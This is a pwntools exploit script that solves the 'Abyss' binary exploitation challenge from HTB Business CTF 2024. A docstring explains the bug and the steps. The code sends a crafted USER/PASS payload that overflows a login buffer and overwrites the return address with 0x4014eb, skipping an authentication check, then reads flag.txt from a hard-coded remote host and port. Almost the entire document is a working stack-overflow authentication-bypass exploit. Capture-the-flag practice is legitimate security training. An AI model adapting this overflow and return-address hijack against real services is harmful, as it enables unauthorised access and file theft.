#!/usr/bin/env python3
"""
HTB Business CTF 2024 - Abyss - Solution Script
Author: Based on official HTB writeup
Category: Pwn / Binary Exploitation
Difficulty: Easy

This exploit demonstrates a buffer overflow vulnerability in the cmd_login()
function that allows bypassing authentication and reading arbitrary files.

VULNERABILITY:
- The cmd_login() function copies user input without proper bounds checking
- When the input buffer is filled without null termination, the copy loop
  continues reading beyond the buffer boundary
- This allows overwriting the return address on the stack

EXPLOITATION STRATEGY:
1. Send LOGIN command
2. Send crafted USER payload that sets up the overflow
3. Send PASS payload that triggers the overflow and overwrites return address
4. Return address points to 0x4014eb (inside cmd_read, after auth check)
5. Send filename to read (flag.txt)
6. Receive and display the flag
"""

from pwn import *

def exploit(host, port):
    """
    Main exploit function
    
    Args:
        host: Target hostname/IP
        port: Target port number
    
    Returns:
        The captured flag as a string
    """
    
    print("[*] HTB Abyss Exploit")
    print(f"[*] Target: {host}:{port}")
    print("[*] Exploiting buffer overflow in cmd_login()")
    print()
    
    # Connect to remote server
    io = remote(host, port)
    print("[+] Connected to server")
    
    # Step 1: Send LOGIN command (command ID = 0)
    io.send(p32(0))
    sleep(0.2)
    print("[*] Sent LOGIN command")
    
    # Step 2: Send crafted USER payload
    # Payload structure:
    #   "USER " (5 bytes)
    #   "AAAAAAAABBBBBBBBC" (17 bytes padding)
    #   "\x1c" (1 byte - magic value that affects loop control)
    #   "DDDDEEEEEEE" (11 bytes padding)
    #   p32(0x4014eb) (4 bytes - return address to cmd_read after auth check)
    user_payload = b"USER " + b"AAAAAAAABBBBBBBBC\x1c" + b"DDDDEEEEEEE" + p32(0x4014eb)
    io.send(user_payload)
    sleep(0.2)
    print("[*] Sent USER payload with return address overwrite")
    
    # Step 3: Send PASS payload to trigger the overflow
    # Fill the entire buffer (512 - 5 for "PASS " = 507 bytes)
    # This completes the stack corruption
    pass_payload = b"PASS " + b"D" * 507
    io.send(pass_payload)
    sleep(0.2)
    print("[*] Sent PASS payload to trigger overflow")
    
    # Step 4: At this point, cmd_login() returns to 0x4014eb
    # This is inside cmd_read(), right after the authentication check
    # So we can directly send the filename to read
    filename = b"flag.txt"
    io.send(filename)
    print(f"[*] Requested file: {filename.decode()}")
    
    # Step 5: Receive the flag
    flag = io.recvall(timeout=2)
    io.close()
    
    flag_str = flag.decode().strip()
    print()
    print("="*60)
    print("[+] SUCCESS! Flag captured:")
    print("="*60)
    print(flag_str)
    print("="*60)
    
    return flag_str


def main():
    """Main function with connection details"""
    
    # Target details
    HOST = '83.136.255.106'
    PORT = 53373
    
    # Set context for pwntools
    context.log_level = 'info'
    context.arch = 'amd64'
    
    # Run the exploit
    try:
        flag = exploit(HOST, PORT)
        
        # Verify flag format
        if flag.startswith("HTB{") and flag.endswith("}"):
            print("\n[+] Valid flag format confirmed!")
        else:
            print("\n[!] Warning: Unexpected flag format")
            
    except Exception as e:
        print(f"\n[-] Exploit failed: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
